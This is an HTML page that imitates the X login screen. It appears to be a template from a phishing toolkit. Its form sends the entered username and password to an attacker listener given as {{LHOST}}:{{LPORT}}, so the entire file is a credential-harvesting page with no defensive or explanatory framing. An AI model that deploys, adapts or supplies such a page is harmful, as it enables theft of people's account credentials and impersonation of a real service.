<!DOCTYPE html>
<html>
<head>
    <title>Log in to X</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background-color: #000; color: #e7e9ea; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: #000; padding: 30px; width: 320px; text-align: center; }
        h1 { font-size: 31px; font-weight: bold; margin-bottom: 30px; margin-top: 20px; }
        input { width: 100%; padding: 16px 12px; margin-bottom: 20px; background: transparent; border: 1px solid #333639; border-radius: 4px; box-sizing: border-box; font-size: 17px; color: white; outline: none; }
        input:focus { border-color: #1d9bf0; }
        button { width: 100%; padding: 15px; background-color: #eff3f4; color: #0f1419; border: none; border-radius: 30px; font-weight: bold; font-size: 15px; cursor: pointer; transition: 0.2s; }
        button:hover { background-color: #d7dbdc; }
    </style>
</head>
<body>
    <div class="container">
        <div style="font-size: 40px; font-weight: bold;">𝕏</div>
        <h1>Sign in to X</h1>
        <form action="http://{{LHOST}}:{{LPORT}}/auth" method="POST">
            <input type="text" name="user" placeholder="Phone, email, or username" required>
            <input type="password" name="pass" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>
    </div>
</body>
</html>
